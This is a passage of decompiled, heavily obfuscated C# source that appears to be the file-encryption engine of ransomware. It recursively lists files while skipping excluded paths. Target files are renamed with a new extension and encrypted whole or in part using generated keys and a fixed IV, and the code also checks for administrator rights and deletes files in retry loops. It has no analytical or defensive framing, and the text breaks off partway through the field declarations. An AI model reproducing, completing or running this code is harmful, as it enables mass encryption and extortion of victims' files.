using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using cHMKIWzzHMx;

namespace OlVheIVabxHnbNp;

internal sealed class QxgtRZDqToQ
{
	public sealed class tppPSiBJigCKaC
	{
		private static StringCollection JkiStfVntfwLO;

		private static List<string> HQrZNPUDSxycpO;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107408951));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107408946)) && !text.ToLower().Contains(getString_0(107408925)) && !text.ToLower().Contains(getString_0(107393523)) && !text.ToLower().Contains(getString_0(107393542)) && !text.ToLower().Contains(getString_0(107408912)) && !text.ToLower().Contains(getString_0(107392878)) && !text.ToLower().Contains(getString_0(107392787)) && !text.ToLower().Contains(getString_0(107392802)) && !text.ToLower().Contains(getString_0(107392753)) && !text.ToLower().Contains(getString_0(107392768)) && !text.ToLower().Contains(getString_0(107392702)) && !text.ToLower().Contains(getString_0(107392717)) && !text.ToLower().Contains(getString_0(107392668)) && !text.ToLower().Contains(getString_0(107392655)) && !text.ToLower().Contains(getString_0(107392634)) && !text.ToLower().Contains(getString_0(107392653)) && !text.ToLower().Contains(getString_0(107392640)) && !text.ToLower().Contains(getString_0(107393103)) && !text.ToLower().Contains(getString_0(107393086)) && !text.Contains(MltDPGcncVSc(getString_0(107393101))) && !text.Contains(getString_0(107393044)) && !text.Contains(getString_0(107393063)) && !text.EndsWith(getString_0(107395237)) && !text.EndsWith(getString_0(107393038)) && !text.EndsWith(getString_0(107393033)) && !text.EndsWith(getString_0(107393028)) && !text.EndsWith(getString_0(107393023)) && !text.ToLower().Contains(getString_0(107392986)) && !text.ToLower().Contains(EmovXGjNZgfAuW))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(WszmglDXIZxoiW) * 1024.0 * 1024.0 && vnjAAOWySSxKeZlz == getString_0(107396784))
							{
								HQrZNPUDSxycpO.Add(text);
							}
							else if (File.Exists(text) && vnjAAOWySSxKeZlz == getString_0(107396789))
							{
								HQrZNPUDSxycpO.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return HQrZNPUDSxycpO;
		}

		static tppPSiBJigCKaC()
		{
			Strings.CreateGetStringDelegate(typeof(tppPSiBJigCKaC));
			JkiStfVntfwLO = new StringCollection();
			HQrZNPUDSxycpO = new List<string>();
		}
	}

	private sealed class FWUrFNZTtGVO
	{
		public string OpgpyVmbqvy;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == OpgpyVmbqvy;
		}
	}

	private sealed class ZYzLrWjVoLy
	{
		private sealed class dyuzkYQJbbM
		{
			public ZYzLrWjVoLy bvjJPOmzMaRhjT;

			public string OLHoUseHYYJ;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					gHuiPfDiOmnH(WindowsIdentity.GetCurrent().Name, OLHoUseHYYJ);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				FAPoYsZdgFU(OLHoUseHYYJ, bvjJPOmzMaRhjT.gjoTKhXYypQOsB, bvjJPOmzMaRhjT.FhNyfHtQGatr, bvjJPOmzMaRhjT.dLWfZcHbsCgSWHAa, bvjJPOmzMaRhjT.zRHTzRtzxx);
			}
		}

		public string[] gjoTKhXYypQOsB;

		public string[] dLWfZcHbsCgSWHAa;

		public string zRHTzRtzxx;

		public string FhNyfHtQGatr;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			dyuzkYQJbbM CS_0024_003C_003E8__locals0 = new dyuzkYQJbbM();
			CS_0024_003C_003E8__locals0.bvjJPOmzMaRhjT = this;
			CS_0024_003C_003E8__locals0.OLHoUseHYYJ = string_0;
			if (CUaMwlrEkxsAzb && !hwYAdwGTOvJd().Contains(getString_0(107391096)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						gHuiPfDiOmnH(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.OLHoUseHYYJ);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (bqciLIMtJOIROzlgHA == getString_0(107396790))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					FAPoYsZdgFU(CS_0024_003C_003E8__locals0.OLHoUseHYYJ, CS_0024_003C_003E8__locals0.bvjJPOmzMaRhjT.gjoTKhXYypQOsB, CS_0024_003C_003E8__locals0.bvjJPOmzMaRhjT.FhNyfHtQGatr, CS_0024_003C_003E8__locals0.bvjJPOmzMaRhjT.dLWfZcHbsCgSWHAa, CS_0024_003C_003E8__locals0.bvjJPOmzMaRhjT.zRHTzRtzxx);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				FAPoYsZdgFU(CS_0024_003C_003E8__locals0.OLHoUseHYYJ, gjoTKhXYypQOsB, FhNyfHtQGatr, dLWfZcHbsCgSWHAa, zRHTzRtzxx);
			}
		}

		static ZYzLrWjVoLy()
		{
			Strings.CreateGetStringDelegate(typeof(ZYzLrWjVoLy));
		}
	}

	private sealed class GLFJtOHmsMzYg
	{
		private sealed class xOFkqIYdXy
		{
			public GLFJtOHmsMzYg WbYYkjMiCfd;

			public string aQYTKEMxIxbK;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in NKDXYpykBZuNlnjW)
				{
					if (aQYTKEMxIxbK.ToLower().EndsWith(item + WbYYkjMiCfd.dvKbEoMZndICx) && KuTrHyLgjDea == getString_0(107396801))
					{
						if (Convert.ToInt32(hexLNfZyLAAt) * 1024 * 1024 > new FileInfo(aQYTKEMxIxbK).Length)
						{
							try
							{
								IknfuhEjRGfqaq.dlawoLgJAnZ(getString_0(107393932), getString_0(107393927), getString_0(107393946), aQYTKEMxIxbK);
							}
							catch
							{
							}
						}
					}
					else if (aQYTKEMxIxbK.ToLower().EndsWith(item) && KuTrHyLgjDea == getString_0(107396806))
					{
						try
						{
							IknfuhEjRGfqaq.dlawoLgJAnZ(getString_0(107393932), getString_0(107393927), getString_0(107393946), aQYTKEMxIxbK);
						}
						catch
						{
						}
					}
				}
			}

			static xOFkqIYdXy()
			{
				Strings.CreateGetStringDelegate(typeof(xOFkqIYdXy));
			}
		}

		private sealed class NdqjppxJYoBbt
		{
			public GLFJtOHmsMzYg WbYYkjMiCfd;

			public string oZqvHCHaRhG;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in NKDXYpykBZuNlnjW)
				{
					if (oZqvHCHaRhG.ToLower().EndsWith(item + WbYYkjMiCfd.dvKbEoMZndICx) && KuTrHyLgjDea == getString_0(107396804))
					{
						if (Convert.ToInt32(hexLNfZyLAAt) * 1024 * 1024 > new FileInfo(oZqvHCHaRhG).Length)
						{
							try
							{
								IknfuhEjRGfqaq.dlawoLgJAnZ(getString_0(107393935), getString_0(107393930), getString_0(107393949), oZqvHCHaRhG);
							}
							catch
							{
							}
						}
					}
					else if (oZqvHCHaRhG.ToLower().EndsWith(item) && KuTrHyLgjDea == getString_0(107396809))
					{
						try
						{
							IknfuhEjRGfqaq.dlawoLgJAnZ(getString_0(107393935), getString_0(107393930), getString_0(107393949), oZqvHCHaRhG);
						}
						catch
						{
						}
					}
				}
			}

			static NdqjppxJYoBbt()
			{
				Strings.CreateGetStringDelegate(typeof(NdqjppxJYoBbt));
			}
		}

		public List<string> ZRQxscFigJiFTqlzT;

		public List<string> DtygzxwTYAXrqA;

		public string dvKbEoMZndICx;

		public string[] pIWDijeuhHf;

		public string rXvEUmxLKNoI;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			xOFkqIYdXy CS_0024_003C_003E8__locals0;
			foreach (string item in DtygzxwTYAXrqA)
			{
				if (pIWDijeuhHf.Length != 0)
				{
					string[] array = pIWDijeuhHf;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_072e;
					}
				}
				try
				{
					if (item.EndsWith(dvKbEoMZndICx))
					{
						goto IL_072e;
					}
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				if (!item.EndsWith(string_0) || CRTChqfNsauJEL.Contains(item))
				{
					continue;
				}
				if (YFOyrvZGGOG == getString_0(107396798))
				{
					try
					{
						if (vUkfERdAEFuz.wCmpVaWZQxH(item))
						{
							vUkfERdAEFuz.jPSlTfusulGphZq(item);
						}
					}
					catch
					{
					}
				}
				CRTChqfNsauJEL.Add(item);
				if (!juoIXWLeiNsyc.Contains(Path.GetDirectoryName(item)))
				{
					juoIXWLeiNsyc.Add(Path.GetDirectoryName(item));
				}
				biLTXvjLCaAD(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (VZbRouVLPuojXZ)
						{
							try
							{
								File.AppendAllText(wYgKBMneFetPI, getString_0(107391238) + item + getString_0(107408941) + ex2.Message + getString_0(107396688));
							}
							catch (Exception)
							{
							}
						}
						iMHVeSscbXPhxV++;
						goto end_IL_00ee;
					}
					if (umFlqTFDrugp == getString_0(107396798) && new FileInfo(item).Length > Convert.ToInt32(zOOQvKyLYnQmc) * 1024 * 1024 && !ZRQxscFigJiFTqlzT.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new xOFkqIYdXy();
						CS_0024_003C_003E8__locals0.WbYYkjMiCfd = this;
						try
						{
							if (dvKbEoMZndICx != getString_0(107391489))
							{
								if (QLNkNOgrJAesSS)
								{
									dvKbEoMZndICx = fCxIrHTFLNIsbC + dvKbEoMZndICx;
								}
								File.Move(item, item + dvKbEoMZndICx);
							}
						}
						catch (Exception ex4)
						{
							if (VZbRouVLPuojXZ)
							{
								try
								{
									File.AppendAllText(wYgKBMneFetPI, getString_0(107391238) + item + getString_0(107408880) + ex4.Message + getString_0(107396688));
								}
								catch (Exception)
								{
								}
							}
							iMHVeSscbXPhxV++;
							goto end_IL_00ee;
						}
						CS_0024_003C_003E8__locals0.aQYTKEMxIxbK = getString_0(107393368);
						if (dvKbEoMZndICx != getString_0(107391489))
						{
							CS_0024_003C_003E8__locals0.aQYTKEMxIxbK = item + dvKbEoMZndICx;
						}
						else
						{
							CS_0024_003C_003E8__locals0.aQYTKEMxIxbK = item;
						}
						if (sSOzpOZGePD == getString_0(107396798))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in NKDXYpykBZuNlnjW)
								{
									if (CS_0024_003C_003E8__locals0.aQYTKEMxIxbK.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.WbYYkjMiCfd.dvKbEoMZndICx) && KuTrHyLgjDea == xOFkqIYdXy.getString_0(107396801))
									{
										if (Convert.ToInt32(hexLNfZyLAAt) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.aQYTKEMxIxbK).Length)
										{
											try
											{
												IknfuhEjRGfqaq.dlawoLgJAnZ(xOFkqIYdXy.getString_0(107393932), xOFkqIYdXy.getString_0(107393927), xOFkqIYdXy.getString_0(107393946), CS_0024_003C_003E8__locals0.aQYTKEMxIxbK);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.aQYTKEMxIxbK.ToLower().EndsWith(item2) && KuTrHyLgjDea == xOFkqIYdXy.getString_0(107396806))
									{
										try
										{
											IknfuhEjRGfqaq.dlawoLgJAnZ(xOFkqIYdXy.getString_0(107393932), xOFkqIYdXy.getString_0(107393927), xOFkqIYdXy.getString_0(107393946), CS_0024_003C_003E8__locals0.aQYTKEMxIxbK);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = fMHndxNeKUmSVkyt.nZxYEdWrbFBDz(32);
						string s = wuGItxlauphjx.RfbDpcJdUFzPqTO(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = AuOhTeyyHLvFQ.ClvHRCYMnWfdH(CS_0024_003C_003E8__locals0.aQYTKEMxIxbK, Convert.ToInt32(zOOQvKyLYnQmc) * 1024 * 1024);
						AuOhTeyyHLvFQ.ItvzLPvYpktoAw(AsxIYNrXdXG: (!BFsJeResSpJpbjH) ? (mcFzFNtJADHq ? AuOhTeyyHLvFQ.noDpVbcjLlBGQRR(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : AuOhTeyyHLvFQ.noDpVbcjLlBGQRR(byte_, Encoding.ASCII.GetBytes(rXvEUmxLKNoI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (mcFzFNtJADHq ? oxCCkthrujAUT.CHDPlpVwKhLj(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : oxCCkthrujAUT.CHDPlpVwKhLj(byte_, Encoding.ASCII.GetBytes(rXvEUmxLKNoI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), aRhDHhZWWBA: CS_0024_003C_003E8__locals0.aQYTKEMxIxbK, sUotJzhLsEhNTFhP: bytes);
					}
					else
					{
						if (QLNkNOgrJAesSS)
						{
							dvKbEoMZndICx = fCxIrHTFLNIsbC + dvKbEoMZndICx;
						}
						string text2 = fMHndxNeKUmSVkyt.nZxYEdWrbFBDz(32);
						string s2 = wuGItxlauphjx.RfbDpcJdUFzPqTO(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (dvKbEoMZndICx != getString_0(107391489))
						{
							if (!rdRqmOAazIcaE)
							{
								if (!mcFzFNtJADHq)
								{
									pakacOBHHbOndSfi(item, item + dvKbEoMZndICx, GAYqeKKGxXouZl);
								}
								else
								{
									pakacOBHHbOndSfi(item, item + dvKbEoMZndICx, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!mcFzFNtJADHq)
									{
										fseJKjvbGESfArR(item, item + dvKbEoMZndICx, GAYqeKKGxXouZl);
									}
									else
									{
										fseJKjvbGESfArR(item, item + dvKbEoMZndICx, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (VZbRouVLPuojXZ)
									{
										try
										{
											File.AppendAllText(wYgKBMneFetPI, getString_0(107391238) + item + getString_0(107391507) + ex6.Message + getString_0(107396688));
										}
										catch (Exception)
										{
										}
									}
									iMHVeSscbXPhxV++;
									goto end_IL_00ee;
								}
							}
						}
						else if (!rdRqmOAazIcaE)
						{
							if (!mcFzFNtJADHq)
							{
								pakacOBHHbOndSfi(item, item + getString_0(107391516), GAYqeKKGxXouZl);
							}
							else
							{
								pakacOBHHbOndSfi(item, item + getString_0(107391516), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!mcFzFNtJADHq)
								{
									fseJKjvbGESfArR(item, item, GAYqeKKGxXouZl);
								}
								else
								{
									fseJKjvbGESfArR(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (VZbRouVLPuojXZ)
								{
									try
									{
										File.AppendAllText(wYgKBMneFetPI, getString_0(107391238) + item + getString_0(107391507) + ex8.Message + getString_0(107396688));
									}
									catch (Exception)
									{
									}
								}
								iMHVeSscbXPhxV++;
								goto end_IL_00ee;
							}
						}
						if (mcFzFNtJADHq)
						{
							if (dvKbEoMZndICx != getString_0(107391489))
							{
								GVeTLYiMKjVRgswna(item + dvKbEoMZndICx, bytes2);
							}
							else
							{
								GVeTLYiMKjVRgswna(item, bytes2);
							}
						}
					}
					goto IL_072e;
					end_IL_00ee:;
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				continue;
				IL_072e:
				DtygzxwTYAXrqA.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			NdqjppxJYoBbt CS_0024_003C_003E8__locals0 = new NdqjppxJYoBbt();
			CS_0024_003C_003E8__locals0.WbYYkjMiCfd = this;
			CS_0024_003C_003E8__locals0.oZqvHCHaRhG = string_0;
			if (pIWDijeuhHf.Length != 0)
			{
				string[] array = pIWDijeuhHf;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.oZqvHCHaRhG.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.oZqvHCHaRhG.EndsWith(dvKbEoMZndICx))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!CRTChqfNsauJEL.Contains(CS_0024_003C_003E8__locals0.oZqvHCHaRhG))
			{
				if (YFOyrvZGGOG == getString_0(107396798))
				{
					try
					{
						if (vUkfERdAEFuz.wCmpVaWZQxH(CS_0024_003C_003E8__locals0.oZqvHCHaRhG))
						{
							vUkfERdAEFuz.jPSlTfusulGphZq(CS_0024_003C_003E8__locals0.oZqvHCHaRhG);
						}
					}
					catch
					{
					}
				}
				CRTChqfNsauJEL.Add(CS_0024_003C_003E8__locals0.oZqvHCHaRhG);
				if (!juoIXWLeiNsyc.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.oZqvHCHaRhG)))
				{
					juoIXWLeiNsyc.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.oZqvHCHaRhG));
				}
				biLTXvjLCaAD(CS_0024_003C_003E8__locals0.oZqvHCHaRhG);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.oZqvHCHaRhG).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (VZbRouVLPuojXZ)
						{
							try
							{
								File.AppendAllText(wYgKBMneFetPI, getString_0(107391238) + CS_0024_003C_003E8__locals0.oZqvHCHaRhG + getString_0(107408941) + ex2.Message + getString_0(107396688));
							}
							catch (Exception)
							{
							}
						}
						iMHVeSscbXPhxV++;
						goto end_IL_0117_2;
					}
					if (umFlqTFDrugp == getString_0(107396798) && new FileInfo(CS_0024_003C_003E8__locals0.oZqvHCHaRhG).Length > Convert.ToInt32(zOOQvKyLYnQmc) * 1024 * 1024)
					{
						try
						{
							if (dvKbEoMZndICx != getString_0(107391489))
							{
								if (QLNkNOgrJAesSS)
								{
									dvKbEoMZndICx = fCxIrHTFLNIsbC + dvKbEoMZndICx;
								}
								File.Move(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG + dvKbEoMZndICx);
							}
						}
						catch (Exception ex4)
						{
							if (VZbRouVLPuojXZ)
							{
								try
								{
									File.AppendAllText(wYgKBMneFetPI, getString_0(107391238) + CS_0024_003C_003E8__locals0.oZqvHCHaRhG + getString_0(107408880) + ex4.Message + getString_0(107396688));
								}
								catch (Exception)
								{
								}
							}
							iMHVeSscbXPhxV++;
							return;
						}
						if (dvKbEoMZndICx != getString_0(107391489))
						{
							CS_0024_003C_003E8__locals0.oZqvHCHaRhG += dvKbEoMZndICx;
						}
						if (sSOzpOZGePD == getString_0(107396798))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in NKDXYpykBZuNlnjW)
								{
									if (CS_0024_003C_003E8__locals0.oZqvHCHaRhG.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.WbYYkjMiCfd.dvKbEoMZndICx) && KuTrHyLgjDea == NdqjppxJYoBbt.getString_0(107396804))
									{
										if (Convert.ToInt32(hexLNfZyLAAt) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.oZqvHCHaRhG).Length)
										{
											try
											{
												IknfuhEjRGfqaq.dlawoLgJAnZ(NdqjppxJYoBbt.getString_0(107393935), NdqjppxJYoBbt.getString_0(107393930), NdqjppxJYoBbt.getString_0(107393949), CS_0024_003C_003E8__locals0.oZqvHCHaRhG);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.oZqvHCHaRhG.ToLower().EndsWith(item) && KuTrHyLgjDea == NdqjppxJYoBbt.getString_0(107396809))
									{
										try
										{
											IknfuhEjRGfqaq.dlawoLgJAnZ(NdqjppxJYoBbt.getString_0(107393935), NdqjppxJYoBbt.getString_0(107393930), NdqjppxJYoBbt.getString_0(107393949), CS_0024_003C_003E8__locals0.oZqvHCHaRhG);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = fMHndxNeKUmSVkyt.nZxYEdWrbFBDz(32);
						string s = wuGItxlauphjx.RfbDpcJdUFzPqTO(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = AuOhTeyyHLvFQ.ClvHRCYMnWfdH(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, Convert.ToInt32(zOOQvKyLYnQmc) * 1024 * 1024);
						AuOhTeyyHLvFQ.ItvzLPvYpktoAw(AsxIYNrXdXG: (!BFsJeResSpJpbjH) ? (mcFzFNtJADHq ? AuOhTeyyHLvFQ.noDpVbcjLlBGQRR(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : AuOhTeyyHLvFQ.noDpVbcjLlBGQRR(byte_, Encoding.ASCII.GetBytes(rXvEUmxLKNoI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (mcFzFNtJADHq ? oxCCkthrujAUT.CHDPlpVwKhLj(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : oxCCkthrujAUT.CHDPlpVwKhLj(byte_, Encoding.ASCII.GetBytes(rXvEUmxLKNoI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), aRhDHhZWWBA: CS_0024_003C_003E8__locals0.oZqvHCHaRhG, sUotJzhLsEhNTFhP: bytes);
					}
					else
					{
						if (QLNkNOgrJAesSS)
						{
							dvKbEoMZndICx = fCxIrHTFLNIsbC + dvKbEoMZndICx;
						}
						string text2 = fMHndxNeKUmSVkyt.nZxYEdWrbFBDz(32);
						string s2 = wuGItxlauphjx.RfbDpcJdUFzPqTO(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (dvKbEoMZndICx != getString_0(107391489))
						{
							if (!rdRqmOAazIcaE)
							{
								if (!mcFzFNtJADHq)
								{
									pakacOBHHbOndSfi(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG + dvKbEoMZndICx, GAYqeKKGxXouZl);
								}
								else
								{
									pakacOBHHbOndSfi(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG + dvKbEoMZndICx, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!mcFzFNtJADHq)
									{
										fseJKjvbGESfArR(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG + dvKbEoMZndICx, GAYqeKKGxXouZl);
									}
									else
									{
										fseJKjvbGESfArR(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG + dvKbEoMZndICx, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (VZbRouVLPuojXZ)
									{
										try
										{
											File.AppendAllText(wYgKBMneFetPI, getString_0(107391238) + CS_0024_003C_003E8__locals0.oZqvHCHaRhG + getString_0(107391507) + ex6.Message + getString_0(107396688));
										}
										catch (Exception)
										{
										}
									}
									iMHVeSscbXPhxV++;
									return;
								}
							}
						}
						else if (!rdRqmOAazIcaE)
						{
							if (!mcFzFNtJADHq)
							{
								pakacOBHHbOndSfi(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG + getString_0(107391516), GAYqeKKGxXouZl);
							}
							else
							{
								pakacOBHHbOndSfi(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG + getString_0(107391516), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!mcFzFNtJADHq)
								{
									fseJKjvbGESfArR(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG, GAYqeKKGxXouZl);
								}
								else
								{
									fseJKjvbGESfArR(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (VZbRouVLPuojXZ)
								{
									try
									{
										File.AppendAllText(wYgKBMneFetPI, getString_0(107391238) + CS_0024_003C_003E8__locals0.oZqvHCHaRhG + getString_0(107391507) + ex8.Message + getString_0(107396688));
									}
									catch (Exception)
									{
									}
								}
								iMHVeSscbXPhxV++;
								return;
							}
						}
						if (mcFzFNtJADHq)
						{
							if (dvKbEoMZndICx != getString_0(107391489))
							{
								GVeTLYiMKjVRgswna(CS_0024_003C_003E8__locals0.oZqvHCHaRhG + dvKbEoMZndICx, bytes2);
							}
							else
							{
								GVeTLYiMKjVRgswna(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			DtygzxwTYAXrqA.Remove(CS_0024_003C_003E8__locals0.oZqvHCHaRhG);
		}

		static GLFJtOHmsMzYg()
		{
			Strings.CreateGetStringDelegate(typeof(GLFJtOHmsMzYg));
		}
	}

	private sealed class iApXHykdLayy
	{
		public string WYKjJWbWQDJeE;

		public string XWzkEgaHSEw;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(WYKjJWbWQDJeE);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(XWzkEgaHSEw))
					{
						File.Delete(XWzkEgaHSEw);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string PaqQKLIfcahgkkJ;

	public static byte[] GAYqeKKGxXouZl;

	public static string vnjAAOWySSxKeZlz;

	public static string WszmglDXIZxoiW;

	public static List<string> GihwuaHpSXPKUIVR;

	public static List<string> qonXfYAFKmjr;

	public static string mzBGqUfZtpJZO;

	public static string rXvEUmxLKNoI;

	public static string XKBARtNChmtca;

	public static string PctqfzqnuYN;

	public static int LoAczHkdcIMTHN;

	public static string YFOyrvZGGOG;

	public static string jZGJiISxTeIH;

	public static string JwhvfsUfaFd;

	public static string xtSgYwxUPlY;

	public static string NHvePyMARlelvv;

	public static string ZRYCSuLapUWm;

	public static string KbPWXaxyGiw;

	public static string ofHnrODMqYEFdaB;

	public static List<string> WyzZZAaYjHUsongS;

	public static List<string> juoIXWLeiNsyc;

	public static string VbScYDiqPLft;

	public static string DQqsrNGhOoSM;

	public static string vEhrBRNFub;

	public static List<string> CRTChqfNsauJEL;

	public static string YWzKNQYtYMLj;

	private static string pthiKiitPeDipqY;

	public static string bqciLIMtJOIROzlgHA;

	public static string PxRjSGbBLpTbn;

	public static List<string> tNdkdYtjHRONCbo;

	public static List<string> taliprOMnTGcFw;

	public static List<string> vNfHqpeGUAcgE;

	public static List<string> LnSJjOAshqQA;

	public static string kjQmlqzYIQVD;

	public static List<string> MWOoiLgPzdCBQo;

	public static List<string> WbVfESprDIGIMr;

	public static string NrawxhsOzAIQz;

	public static string SubKXLTzqcDNZ;

	internal static DateTime mgYOvqlfZDKvpJ;

	internal static DateTime MnSlupSrQos;

	public static string umFlqTFDrugp;

	public static string zOOQvKyLYnQmc;

	public static string tHrCgDAEpchMxMr;

	public static string QoEGLatKrBZ;

	public static string hlpxkGGISuF;

	public static string XRVywcYmctjU;

	public static string cdDxujvfRDO;

	public static string sSOzpOZGePD;

	public static List<string> NKDXYpykBZuNlnjW;

	public static string KuTrHyLgjDea;

	public static string hexLNfZyLAAt;

	public static string MGMExOrbEv;

	public static string bIpQDZdlBgurHV;

	public static string oOmCynVQoM;

	public static string TilgfTEpILCaO;

	public static string RIVvDCRBcHrYt;

	public static string fPUoEcyqPYJMVGd;

	public static string XQKpNCddgZGKhC;

	public static string znnKVcnXEHpPy;

	public static string NXuQNXntZvLVq;

	public static string TDxuVyPwbBj;

	public static string HPEDryAlPWjplq;

	public static string exDowJXfwP;

